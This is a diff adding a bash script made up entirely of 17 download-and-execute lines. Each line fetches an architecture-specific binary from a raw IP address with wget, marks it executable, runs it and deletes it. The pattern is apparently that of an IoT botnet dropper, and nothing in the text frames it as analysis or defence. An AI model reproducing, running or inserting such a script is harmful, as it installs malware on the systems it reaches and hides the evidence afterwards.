@@ -1,0 +1,18 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/mips; chmod +x mips; ./mips; rm -rf mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/sh4; chmod +x sh4; ./sh4; rm -rf sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/x86_64; chmod +x x86_64; ./x86_64; rm -rf x86_64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/armv6l; chmod +x armv6l; ./armv6l; rm -rf armv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/i686; chmod +x i686; ./i686; rm -rf i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/ppc; chmod +x ppc; ./ppc; rm -rf ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/i586; chmod +x i586; ./i586; rm -rf i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/m68k; chmod +x m68k; ./m68k; rm -rf m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/sparc; chmod +x sparc; ./sparc; rm -rf sparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/armv4l; chmod +x armv4l; ./armv4l; rm -rf armv4l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/armv5l; chmod +x armv5l; ./armv5l; rm -rf armv5l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/powerpc; chmod +x powerpc; ./powerpc; rm -rf powerpc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/mips64; chmod +x mips64; ./mips64; rm -rf mips64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/armv4eb; chmod +x armv4eb; ./armv4eb; rm -rf armv4eb
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/armv4tl; chmod +x armv4tl; ./armv4tl; rm -rf armv4tl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.34/arm7; chmod +x arm7; ./arm7; rm -rf arm7
